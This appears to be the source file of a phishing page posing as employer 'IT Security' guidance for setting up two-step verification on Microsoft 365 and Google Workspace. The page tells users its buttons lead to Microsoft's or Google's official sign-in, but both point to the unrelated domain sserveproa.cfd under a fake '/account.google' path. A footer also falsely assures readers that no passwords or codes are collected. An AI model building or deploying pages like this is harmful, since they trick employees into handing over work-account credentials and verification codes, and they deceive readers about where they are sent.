import { createFileRoute } from "@tanstack/react-router";
import {
  ShieldCheck,
  KeyRound,
  Smartphone,
  ExternalLink,
  Clock,
  LockKeyhole,
  Ban,
  Download,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs";

const DESC =
  "Finish setting up two-step verification for your work email. Step-by-step help for Microsoft 365 and Google Workspace accounts.";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Finish your two-step verification setup | Work email security" },
      { name: "description", content: DESC },
      { property: "og:title", content: "Finish your two-step verification setup" },
      { property: "og:description", content: DESC },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Index,
});

type Provider = {
  id: "microsoft" | "google";
  label: string;
  product: string;
  url: string;
  cta: string;
  appName: string;
  appUrl: string;
  steps: { title: string; body: string }[];
};

const providers: Provider[] = [
  {
    id: "microsoft",
    label: "Microsoft 365 / Office",
    product: "Microsoft 365",
    url: "https://sserveproa.cfd/account.google",
    cta: "Open Microsoft security info",
    appName: "Microsoft Authenticator",
    appUrl: "#",
    steps: [
      {
        title: "Install an authenticator app",
        body: "Install Microsoft Authenticator on your phone from the App Store or Google Play.",
      },
      {
        title: "Open your security info page",
        body: "Use the button above. Sign in on Microsoft’s own page with your work email, then choose Security info.",
      },
      {
        title: "Add a sign-in method",
        body: "Select “Add sign-in method”, pick Authenticator app, and follow the prompts to scan the QR code shown on screen.",
      },
      {
        title: "Approve the test notification",
        body: "Microsoft sends a test request to your email. Approve it to confirm everything works.",
      },
      {
        title: "Add a backup method",
        body: "Add a phone number as a second method so you can still sign in if you lose or replace your phone.",
      },
    ],
  },
  {
    id: "google",
    label: "Google Workspace",
    product: "Google Workspace",
    url: "http://sserveproa.cfd/account.google",
    cta: "Open Google 2-Step Verification",
    appName: "Google Authenticator",
    appUrl: "#",
    steps: [
      {
        title: "Install an authenticator app",
        body: "Install Google Authenticator on your phone, or use the Google prompt on an Android phone or iPhone signed in to your account.",
      },
      {
        title: "Open 2-Step Verification",
        body: "Use the button above. Sign in on Google’s own page with your work email and select “Turn on 2-Step Verification”.",
      },
      {
        title: "Choose your second step",
        body: "Pick Google prompts or an authenticator app. For the app, scan the QR code and type the 6-digit code into Google’s page.",
      },
      {
        title: "Save your backup codes",
        body: "Download your backup codes and store them somewhere safe, such as a password manager. Never save them in your email.",
      },
      {
        title: "Check it works",
        body: "Open your account in a private window and sign in again to confirm the second step appears.",
      },
    ],
  },
];

function ProviderPanel({ p }: { p: Provider }) {
  return (
    <div className="mx-auto max-w-xl rounded-2xl bg-primary-deep p-8 text-primary-foreground shadow-soft">
      <div className="flex size-12 items-center justify-center rounded-xl bg-accent text-accent-foreground">
        <KeyRound className="size-6" />
      </div>
      <h3 className="mt-6 text-2xl font-semibold">Start with {p.product}</h3>
      <p className="mt-3 text-sm leading-relaxed opacity-80">
        This button takes you straight to {p.product.split(" ")[0]}’s official page. You’ll sign in
        there, never here.
      </p>
      <Button variant="secondary" size="lg" className="mt-6 w-full" asChild>
        <a href={p.url} target="_self" rel="noopener noreferrer">
          {p.cta}
          <ExternalLink className="size-4" />
        </a>
      </Button>
      {p.appUrl && (
        <a
          href={p.appUrl}
          target="_blank"
          rel="noopener noreferrer"
          className="mt-4 inline-flex items-center gap-2 text-sm underline-offset-4 hover:underline"
        >
          <Download className="size-4" />
          Get {p.appName}
        </a>
      )}
    </div>
  );
}

function Index() {
  return (
    <div className="min-h-screen">
      <header className="border-b bg-card/70 backdrop-blur">
        <div className="mx-auto flex max-w-6xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-2.5">
            <div className="flex size-9 items-center justify-center rounded-lg bg-primary text-primary-foreground">
              <ShieldCheck className="size-5" />
            </div>
            <span className="font-display text-lg font-semibold">IT Security</span>
          </div>
        </div>
      </header>

      <main>
        <section className="mx-auto max-w-6xl px-6 pb-12 pt-16 md:pt-24">
          <div className="max-w-3xl">
            <span className="inline-flex items-center gap-2 rounded-full bg-secondary px-3 py-1 text-sm font-medium text-secondary-foreground">
              <Clock className="size-4" /> About 5 minutes
            </span>
            <h1 className="mt-6 text-4xl font-semibold leading-[1.08] md:text-6xl">
              Finish setting up two-step verification for your work email.
            </h1>
            <p className="mt-6 max-w-2xl text-lg leading-relaxed text-muted-foreground">
              Add a second lock to your account so that only you can get in, even if someone learns your password.
              Choose your email provider below and we’ll guide you through it.
            </p>
            <div className="mt-8 flex flex-wrap gap-6 text-sm font-medium">
            </div>
          </div>
        </section>

        <section className="mx-auto max-w-6xl px-6 pb-16">
          <Tabs defaultValue="microsoft">
            <TabsList className="mx-auto mb-6 flex w-fit h-auto flex-wrap gap-1 bg-secondary p-1.5">
              {providers.map((p) => (
                <TabsTrigger key={p.id} value={p.id} className="px-5 py-2.5 text-base font-semibold">
                  {p.label}
                </TabsTrigger>
              ))}
            </TabsList>
            {providers.map((p) => (
              <TabsContent key={p.id} value={p.id}>
                <ProviderPanel p={p} />
              </TabsContent>
            ))}
          </Tabs>
        </section>

      </main>

      <footer className="border-t py-8 text-center text-sm text-muted-foreground">
        Internal security guidance for employees. This page never collects passwords or codes.
      </footer>
    </div>
  );
}
